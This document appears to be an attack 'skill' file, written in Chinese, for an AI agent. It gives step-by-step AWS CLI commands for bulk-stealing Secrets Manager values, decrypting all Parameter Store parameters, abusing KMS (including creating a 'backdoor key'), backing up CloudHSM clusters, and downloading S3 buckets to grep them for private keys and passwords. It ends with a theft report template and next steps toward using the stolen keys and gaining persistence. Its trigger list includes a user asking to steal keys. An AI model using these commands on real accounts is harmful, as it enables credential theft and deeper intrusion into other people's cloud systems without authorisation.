---
name: aws-secrets-attack
type: attack
category: secrets-exfiltration
platform: aws
severity: critical
---

# AWS Secrets 攻击技能

## 触发条件

- 有 AWS 凭证且有 Secrets Manager/KMS 权限
- 发现 secretsmanager:* 或 kms:* 权限
- 用户要求"窃取密钥"

## 前置检查

```bash
# 1. 列出 Secrets Manager 密钥
aws secretsmanager list-secrets

# 2. 列出 KMS 密钥
aws kms list-keys

# 3. 列出 Parameter Store 参数
aws ssm describe-parameters
```

## 攻击方法

### 方法 1: Secrets Manager 窃取

```bash
# 1. 列出所有密钥
aws secretsmanager list-secrets --query 'SecretList[].Name'

# 2. 获取密钥值
aws secretsmanager get-secret-value --secret-id secret-name

# 3. 批量获取所有密钥
for secret in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
    echo "=== Secret: $secret ==="
    aws secretsmanager get-secret-value --secret-id "$secret"
    echo ""
done > all_secrets.txt

# 4. 解密密文（如果使用 KMS 加密）
aws kms decrypt \
  --ciphertext-blob fileb://encrypted_secret \
  --output text > decrypted_secret.txt
```

### 方法 2: Parameter Store 窃取

```bash
# 1. 列出所有参数
aws ssm describe-parameters --query 'Parameters[].Name'

# 2. 获取参数值（普通参数）
aws ssm get-parameter --name "/param/name"

# 3. 获取参数值（加密参数）
aws ssm get-parameter \
  --name "/param/name" \
  --with-decryption

# 4. 批量获取参数
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

### 方法 3: KMS 密钥攻击

```bash
# 1. 列出所有 KMS 密钥
aws kms list-keys

# 2. 描述密钥
aws kms describe-key --key-id alias/target-key

# 3. 测试加密权限
echo "sensitive data" | aws kms encrypt \
  --key-id alias/target-key \
  --plaintext fileb://-/ \
  --output text > encrypted.b64

# 4. 解密数据
aws kms decrypt \
  --ciphertext-blob fileb://encrypted.b64 \
  --output text

# 5. 创建新的密钥材料（如果有权限）
aws kms create-key --description "Backdoor key"
```

### 方法 4: CloudHSM 攻击

```bash
# 1. 列出 HSM 集群
aws cloudhsmv2 describe-clusters

# 2. 列出 HSM 实例
aws cloudhsmv2 describe-backups

# 3. 创建备份（如果有权限）
aws cloudhsmv2 create-backup --cluster-id cluster-xxx
```

### 方法 5: S3 存储的密钥

```bash
# 1. 搜索包含密钥的文件
aws s3 ls s3://secrets-bucket --recursive | grep -E '\.(key|pem|env|json)$'

# 2. 下载密钥文件
aws s3 sync s3://secrets-bucket ./downloaded-keys

# 3. 搜索文件内容
grep -r "BEGIN.*PRIVATE KEY" ./downloaded-keys
grep -r "password\|secret\|token" ./downloaded-keys --include="*.env" --include="*.json"
```

## 验证成功

```bash
# 成功获取密钥
cat all_secrets.txt

# 成功解密数据
cat decrypted_secret.txt

# 成功下载密钥文件
ls -lh ./downloaded-keys/
```

## 输出报告

```markdown
# AWS Secrets 窃取报告
- Secrets Manager 密钥: X 个
- Parameter Store 参数: Y 个
- KMS 密钥: Z 个
- S3 密钥文件: N 个
- 发现的敏感信息: [列表]
```

## 下一步

1. 分析窃取的密钥
2. 使用密钥访问其他资源
3. aws-persistence - 建立持久化
